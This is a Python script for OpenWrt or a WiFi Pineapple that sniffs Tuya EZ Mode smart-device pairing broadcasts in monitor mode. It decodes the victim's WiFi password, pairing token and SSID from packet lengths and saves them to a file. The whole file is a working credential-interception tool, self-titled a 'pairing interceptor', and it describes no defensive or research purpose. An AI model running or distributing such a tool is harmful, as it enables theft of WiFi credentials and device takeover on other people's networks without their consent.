#!/usr/bin/env python3
"""
Lightweight Tuya EZ Mode sniffer for OpenWrt/Pineapple.
No external dependencies — uses raw sockets only.

Captures the Tuya SmartConfig broadcast encoding during pairing.
The WiFi password and pairing token are encoded in UDP broadcast
packet lengths. This script decodes them from monitor mode.

Usage: python3 tuya_sniff.py wlan1mon
"""
import socket
import struct
import sys
import time
import os
import json
import subprocess
import threading

IFACE = sys.argv[1] if len(sys.argv) > 1 else "wlan1mon"

DATA_OFFSET = 49
PREAMBLE_PATTERN = [1, 3, 6, 10]
MIN_CAPTURE_PACKETS = 50
MAX_CAPTURE_TIME = 20

lengths_buffer = []
capture_active = False
capture_src = None
capture_data = []
capture_start = 0


def channel_hop():
    channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
    idx = 0
    while True:
        ch = channels[idx % len(channels)]
        try:
            subprocess.run(
                ["iw", "dev", IFACE, "set", "channel", str(ch)],
                capture_output=True, timeout=2
            )
        except:
            pass
        idx += 1
        time.sleep(0.3)


def is_broadcast(addr):
    return addr == b'\xff\xff\xff\xff\xff\xff'


def mac_str(raw):
    return ':'.join(f'{b:02x}' for b in raw)


def check_preamble(recent):
    if len(recent) < len(PREAMBLE_PATTERN):
        return False
    tail = [l - DATA_OFFSET for l in recent[-len(PREAMBLE_PATTERN):]]
    return tail == PREAMBLE_PATTERN


def decode_payload(lengths):
    raw = bytearray()
    for l in lengths:
        v = l - DATA_OFFSET
        if 0 <= v <= 255:
            raw.append(v)
    return raw


def try_parse(data):
    result = {}
    if len(data) < 4:
        return result

    try:
        passwd_len = data[0]
        rest_len = data[1]
        offset = 2

        if passwd_len > 0 and offset + passwd_len <= len(data):
            result['wifi_password'] = data[offset:offset+passwd_len].decode('utf-8', errors='replace')
            offset += passwd_len

        if rest_len > 0 and offset + rest_len <= len(data):
            token_region = data[offset:offset+rest_len]
            if len(token_region) >= 2:
                result['region'] = token_region[:2].decode('utf-8', errors='replace')
                result['token'] = token_region[2:].decode('utf-8', errors='replace')
            offset += rest_len

        if offset < len(data):
            ssid_data = data[offset:]
            result['ssid'] = ssid_data.decode('utf-8', errors='replace')
    except Exception as e:
        result['parse_error'] = str(e)

    return result


def process_frame(frame):
    global lengths_buffer, capture_active, capture_src, capture_data, capture_start

    if len(frame) < 24:
        return

    fc = struct.unpack('<H', frame[0:2])[0]
    frame_type = (fc >> 2) & 0x3
    frame_subtype = (fc >> 4) & 0xf

    if frame_type != 2:
        return

    addr1 = frame[4:10]
    addr2 = frame[10:16]

    if not is_broadcast(addr1):
        return

    frame_len = len(frame)
    src = mac_str(addr2)

    if not capture_active:
        lengths_buffer.append((src, frame_len))
        if len(lengths_buffer) > 200:
            lengths_buffer = lengths_buffer[-100:]

        per_src = {}
        for s, l in lengths_buffer:
            if s not in per_src:
                per_src[s] = []
            per_src[s].append(l)

        for s, lens in per_src.items():
            if check_preamble(lens):
                capture_active = True
                capture_src = s
                capture_data = []
                capture_start = time.time()
                lengths_buffer = []
                print(f"\n{'='*50}")
                print(f"[!] TUYA EZ MODE DETECTED from {s}")
                print(f"[*] Capturing pairing data...")
                return
    else:
        if src == capture_src:
            capture_data.append(frame_len)
            elapsed = time.time() - capture_start
            sys.stdout.write(f"\r[*] {len(capture_data)} packets ({elapsed:.1f}s) ")
            sys.stdout.flush()

            if len(capture_data) >= MIN_CAPTURE_PACKETS or elapsed > MAX_CAPTURE_TIME:
                print(f"\n\n[+] Capture complete: {len(capture_data)} packets")

                decoded = decode_payload(capture_data)
                print(f"[+] Decoded {len(decoded)} bytes")
                print(f"    Hex: {decoded.hex()}")

                parsed = try_parse(decoded)
                if parsed:
                    print(f"\n[+] === EXTRACTED DATA ===")
                    for k, v in parsed.items():
                        print(f"    {k}: {v}")

                outfile = '/tmp/tuya_pairing_capture.json'
                with open(outfile, 'w') as f:
                    json.dump({
                        'source_mac': capture_src,
                        'timestamp': time.time(),
                        'raw_lengths': capture_data,
                        'decoded_hex': decoded.hex(),
                        'parsed': parsed,
                    }, f, indent=2)
                print(f"\n[+] Saved to {outfile}")

                capture_active = False
                capture_src = None
                capture_data = []
                print(f"\n[*] Listening for next pairing...")


def main():
    print("=" * 50)
    print("TUYA EZ MODE PAIRING INTERCEPTOR")
    print("=" * 50)
    print(f"Interface: {IFACE}")
    print(f"Waiting for Tuya SmartConfig broadcasts...")
    print(f"Plug in a new bulb and pair it with Tuya Smart app.")
    print(f"Press Ctrl+C to stop.\n")

    hopper = threading.Thread(target=channel_hop, daemon=True)
    hopper.start()

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    sock.bind((IFACE, 0))

    try:
        while True:
            frame = sock.recv(4096)
            process_frame(frame)
    except KeyboardInterrupt:
        print("\n\nStopped.")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
